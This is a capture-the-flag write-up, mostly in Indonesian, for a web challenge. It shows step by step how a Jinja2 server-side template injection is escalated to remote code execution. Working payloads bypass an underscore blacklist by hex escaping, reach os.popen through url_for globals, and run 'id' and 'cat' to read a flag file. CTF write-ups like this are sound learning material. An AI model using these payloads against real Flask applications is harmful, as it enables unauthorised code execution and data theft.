# Temporary Destruction - Writeup

Challenge category: Web Misc  
Target: `http://23.179.17.92:5558`

## Ringkasan

Aplikasi ini vulnerable ke **Server-Side Template Injection (SSTI)** di Jinja2.  
Input user dirender sebagai template, sehingga ekspresi seperti `{{7*7}}` dieksekusi server.

Dari SSTI, saya escalate ke RCE dan baca file flag di server.

Flag: `CIT{55T1_R3m0t3_C0d3_3x3cut1on}`

## Langkah Penyelesaian

1. **Enumerasi awal**
   - `GET /` menampilkan form dengan textarea `user_input`.
   - Setelah submit, hasil ditampilkan di `<pre>...</pre>`.

2. **Cek SSTI**
   - Kirim payload:
     ```jinja2
     {{7*7}}
     ```
   - Output menjadi `49`, artinya template dievaluasi di server (SSTI confirmed).

3. **Uji jalur object traversal**
   - Payload `{{url_for.__globals__}}` menghasilkan `rejected.` (ada blacklist sederhana).
   - Bypass blacklist dilakukan dengan hex escape untuk karakter `_`:
     ```jinja2
     {{url_for|attr('\x5f\x5fglobals\x5f\x5f')}}
     ```
   - Ini berhasil membuka akses ke global namespace Flask module.

4. **RCE**
   - Panggil `os.popen` dari globals:
     ```jinja2
     {{(url_for|attr('\x5f\x5fglobals\x5f\x5f'))['os'].popen('id').read()}}
     ```
   - Output valid (`uid=1000(ctf) ...`) => command execution berhasil.

5. **Ambil flag**
   - Enumerasi file cepat menemukan `/tmp/flag.txt`.
   - Baca isi:
     ```jinja2
     {{(url_for|attr('\x5f\x5fglobals\x5f\x5f'))['os'].popen('cat /tmp/flag.txt').read()}}
     ```
   - Flag didapat.

## Solver

File solver disimpan di: `solver.py`

Jalankan:

```bash
source /home/nata/ctf_env/bin/activate
python3 solver.py
```

Atau custom target:

```bash
python3 solver.py -u http://23.179.17.92:5558/
```
